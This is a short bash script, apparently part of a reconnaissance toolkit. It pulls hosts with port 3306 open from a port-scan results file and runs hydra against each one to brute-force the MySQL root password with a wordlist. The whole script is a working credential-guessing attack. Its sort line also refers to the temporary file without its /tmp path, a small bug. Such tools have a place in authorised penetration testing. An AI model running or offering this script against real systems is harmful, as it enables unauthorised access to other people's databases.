#!/bin/bash

wordlist=/usr/share/wordlists/mysql.txt

cat ~/targets/_results/ports.new | grep 3306 | cut -d ' ' -f3 > /tmp/mysql_ip.txt
sort -uo /tmp/mysql_ip.txt mysql_ip.txt

cat /tmp/mysql_ip.txt | xargs -I IP hydra -l root -P $wordlist IP mysql

rm /tmp/mysql_ip.txt
